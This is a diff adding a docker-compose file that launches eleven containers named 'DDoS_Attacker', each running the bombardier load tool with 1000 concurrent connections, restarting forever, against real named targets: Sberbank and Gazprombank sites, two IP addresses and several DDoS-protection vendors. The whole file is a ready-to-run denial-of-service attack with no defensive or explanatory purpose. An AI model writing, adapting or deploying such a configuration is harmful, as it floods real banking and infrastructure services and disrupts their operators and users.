@@ -1,0 +1,58 @@
+version: "3.9"
+services:
+  s0:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_0"
+    command: [ "-c", "1000", "-d", "60s", "-l", "https://acs7.sbrf.ru" ]
+    restart: "always"
+  s1:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_1"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://acs8.sbrf.ru"]
+    restart: "always"
+  s2:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_2"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://gazprombank.lu"]
+    restart: "always"
+  s3:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_3"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://sber.ru"]
+    restart: "always"
+  s4:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_4"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://185.157.96.130"]
+    restart: "always"
+  s5:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_5"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://profile.sber.ru"]
+    restart: "always"
+  s6:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_6"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://84.252.144.102"]
+    restart: "always"
+  s7:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_7"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://ddos-guard.net/ru"]
+    restart: "always"
+  s8:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_8"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://stormwall.pro/"]
+    restart: "always"
+  s9:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_9"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://qrator.net/ru/"]
+    restart: "always"
+  s10:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_10"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://solidwall.ru/"]
+    restart: "always"
+
